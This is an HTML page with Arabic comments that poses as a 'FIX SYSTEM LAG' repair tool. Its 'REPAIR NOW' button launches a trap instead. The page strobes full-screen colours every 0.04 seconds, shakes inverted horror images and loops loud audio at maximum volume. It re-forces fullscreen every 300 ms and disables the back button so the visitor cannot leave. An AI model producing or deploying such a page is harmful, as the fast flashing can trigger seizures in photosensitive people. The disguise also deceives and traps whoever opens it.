<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SYSTEM FAILURE - RELOAD</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
        
        #overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #fff; z-index: 10000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center; 
        }
        .btn-start { 
            background: #ff0000; color: #fff; border: 10px solid #000; 
            padding: 35px 70px; font-size: 35px; font-weight: bold; 
            border-radius: 60px; cursor: pointer; box-shadow: 0 12px 0 #900;
        }

        /* أنيميشن الألوان الصارخة سواسوة */
        @keyframes flash_vibrant {
            0% { background: #ff0000; } 33% { background: #00ff00; }
            66% { background: #0000ff; } 100% { background: #ff00ff; }
        }
        .active-bg { animation: flash_vibrant 0.04s infinite; }

        #stage { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
        .h-img { 
            position: absolute; width: 100%; height: 100%; object-fit: cover; 
            opacity: 0; mix-blend-mode: difference; 
        }

        /* أنيميشن الحركة العنيفة سواسوة */
        @keyframes horror_shake {
            0% { transform: scale(1.1) translate(10px, -10px); filter: invert(0); }
            50% { transform: scale(1.6) translate(-30px, 30px) rotate(8deg); filter: invert(1) contrast(4); }
            100% { transform: scale(1.3) translate(20px, 20px) rotate(-8deg); }
        }
        .vibrate-heavy { opacity: 1 !important; animation: horror_shake 0.02s infinite linear; }
    </style>
</head>
<body id="b">

    <div id="overlay">
        <h1 style="color:#000; font-family:Arial;">FIX SYSTEM LAG</h1>
        <button class="btn-start" onclick="igniteChaos()">REPAIR NOW</button>
    </div>

    <div id="stage">
        <img class="h-img" id="i1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
        <img class="h-img" id="i2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
        <img class="h-img" id="i3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
        <img class="h-img" id="i4" src="https://i.ibb.co/4H7RV4m/image.jpg">
    </div>

    <script>
        const ids = ['i1', 'i2', 'i3', 'i4'];
        // الصوت المباشر الجديد سواسوة
        const audioLink = "https://www.myinstants.com/media/sounds/nykwny.mp3";

        function igniteChaos() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('b').classList.add('active-bg');
            document.getElementById('stage').style.display = 'block';

            // ملء الشاشة القسري سواسوة
            let doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();

            // تشغيل الصوت بقوة قصوى وتكرار سواسوة
            let audio = new Audio(audioLink);
            audio.loop = true;
            audio.volume = 1.0;
            const forcePlay = () => audio.play().catch(() => setTimeout(forcePlay, 50));
            forcePlay();

            // نظام التبديل كل 10 ثوانٍ سواسوة
            let current = 0;
            document.getElementById(ids[current]).classList.add('vibrate-heavy');

            setInterval(() => {
                document.getElementById(ids[current]).classList.remove('vibrate-heavy');
                current = (current + 1) % ids.length;
                document.getElementById(ids[current]).classList.add('vibrate-heavy');
            }, 10000); // 10 ثوانٍ سواسوة

            // قفل الخروج والحبس سواسوة
            setInterval(() => {
                if (!document.fullscreenElement) doc.requestFullscreen();
                window.scrollTo(0, 0);
            }, 300);

            history.pushState(null, null, location.href);
            window.onpopstate = () => history.go(1);
        }
    </script>
</body>
</html>
